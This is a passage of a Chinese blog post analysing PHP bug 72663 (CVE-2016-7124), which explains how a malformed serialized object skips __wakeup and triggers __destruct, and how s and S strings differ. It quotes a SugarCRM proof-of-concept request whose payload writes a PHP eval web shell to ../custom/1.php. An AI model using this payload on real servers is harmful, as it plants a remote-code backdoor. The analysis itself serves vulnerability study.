+<h3 id="总结">总结</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$f2 = 'O:<span class="number">4</span>:"Test":<span class="number">4</span>:&#123;s:<span class="number">10</span>:"'."\<span class="number">0</span>Test\<span class="number">0</span>".'name";s:<span class="number">3</span>:"<span class="comment">Rem";s:6:"'."\0*\0".'age";i:14;s:3:"sex";s:4:"girl";&#125;';</span></span><br></pre></td></tr></table></figure>
+<p>针对上面这串序列化字符串猜测反序列化是从左往右执行, 首先匹配到O, 得知是一个对象 -&gt; 匹配到4, 得知对象名为4个字符串 -&gt; 匹配对象名<code>Test</code>, 搜索自己的内存空间检测是否定义过该对象, 得知定义过, 分配sizeof(Test)大小的内存空间 -&gt; 匹配到4, 得知有给4个对象属性赋值 -&gt; 第一个匹配到s, 得知是字符串变量 -&gt; 匹配到10, 得知变量名长度为10 -&gt; 匹配变量名, 发现开头是”\0”+对象名+”\0”, 得知是private变量, 其后为变量名 -&gt; (重点结束开始快进)匹配s:3:”Rem”, 变量的值为长度为3的字符串Rem -&gt; ……..匹配结束第三个属性, 匹配第四个, 匹配到}, 出错, 退出序列化, 销毁对象, 执行<strong>destruct方法(就是这里跳过了</strong>wakeup方法直接执行__destruct方法)</p>
+<p>然后稍微看看SugarCRM的PoC<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    '<span class="keyword">method</span>': 'login',</span><br><span class="line">    'input_type': '<span class="type">Serialize</span>',</span><br><span class="line">    'rest_data': 'O:+<span class="number">14</span>:<span class="string">"SugarCacheFile"</span>:<span class="number">23</span>:&#123;S:<span class="number">17</span>:<span class="string">"\\00*\\00_cacheFileName"</span>;s:<span class="number">15</span>:<span class="string">"../custom/1.php"</span>;S:<span class="number">16</span>:<span class="string">"\\00*\\00_cacheChanged"</span>;b:<span class="number">1</span>;S:<span class="number">14</span>:<span class="string">"\\00*\\00_localStore"</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">29</span>:<span class="string">"&lt;?php eval($_POST[\'HHH\']); ?&gt;"</span>;&#125;&#125;',</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里出现了一个问题, 纠结了我很久, 这里的payload用的是<code>&#39;\00*\00&#39;</code> 而不是 <code>&quot;\00*\00&quot;</code>, 而之间测试代码告诉我们的不一样啊, 为啥<code>&#39;\00*\00&#39;</code>也行呢?</p>
+<p>PS: 这里注意区别<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="prompt">&gt;&gt;</span>&gt; a = <span class="string">"\\00*\\00"</span>	       <span class="comment"># 这个是php的'\00*\00'</span></span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;</span>&gt; b = <span class="string">"\00*\00"</span>		   <span class="comment"># 这个是php的"\00*\00"</span></span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;</span>&gt; a.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'5c30302a5c3030'</span></span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;</span>&gt; b.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'002a00'</span></span><br></pre></td></tr></table></figure></p>
+<p>最后找到一些非官方的资料(找不到官方的): <a href="http://www.neatstudio.com/show-161-1.shtml" target="_blank" rel="external">http://www.neatstudio.com/show-161-1.shtml</a></p>
+<ul>
+<li>a - array</li>
+<li>b - boolean</li>
+<li>d - double</li>
+<li>i - integer</li>
+<li>o - common object</li>
+<li>r - reference</li>
+<li>s - non-escaped binary string</li>
+<li>S - escaped binary string</li>
+<li>C - custom object</li>
+<li>O - class</li>
+<li>N - null</li>
+<li>R - pointer reference</li>
+<li>U - unicode string</li>
+</ul>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">s:</span><span class="number">5</span>:<span class="string">"\00te"</span>    表示的是<span class="number">5</span>个字符\ <span class="number">0</span> <span class="number">0</span> t e</span><br><span class="line"><span class="label">S:</span><span class="number">3</span>:<span class="string">"\00te"</span>	   表示的是<span class="number">3</span>个字符\<span class="number">0</span> t e</span><br></pre></td></tr></table></figure>
+<p>测试代码中我用的是<code>s</code>, 而payload中用的是<code>S</code>, 所以说本质还是一样的, 也就是我上面所说, 是<code>&quot;\0*\0&quot;</code></p>
+<p>该bug影响的php版本和SugarCRM漏洞详情请看p0wd3r分析文章</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2016-09-13, 11:11:11</p>
+        <p><span>最后更新:</span>2016-09-13, 18:25:30</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/09/13/0x22/" title="php bugs 72663分析(CVE-2016-7124)">http://0x48.pw/2016/09/13/0x22/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/09/13/0x22/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/08/31/0x21/">
+                    Cisco ASA RCE 环境搭建
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#问题1"><span class="toc-number">1.</span> <span class="toc-text">问题1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#问题2"><span class="toc-number">2.</span> <span class="toc-text">问题2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+    <div class="share">
+    <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+    <a href="#" class="bds_copy" data-cmd="copy" title="复制网址"></a>
+    <a href="#" class="bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+    </div>
+    <script>
+        window._bd_share_config={
+            "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+    </script>
+</div>
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="2016/09/13/0x22/" data-title="php bugs 72663分析(CVE-2016-7124)" data-url="http://0x48.pw/2016/09/13/0x22/"></div>
+    <!-- 多说评论框 end -->
+    <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+    <script type="text/javascript">
+    var duoshuoQuery = {short_name:"hcamael"};
+    (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+    </script>
+    <!-- 多说公共JS代码 end -->
+</div>
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/08/31/0x21/" title="下一篇: Cisco ASA RCE 环境搭建">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2016 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >本站到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(http://7xscw6.com1.z0.glb.clouddn.com/bg-bg-xx.jpg)".replace(/xx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+
+<!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//qn.lazysheep.cc/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+</body>
+</html>
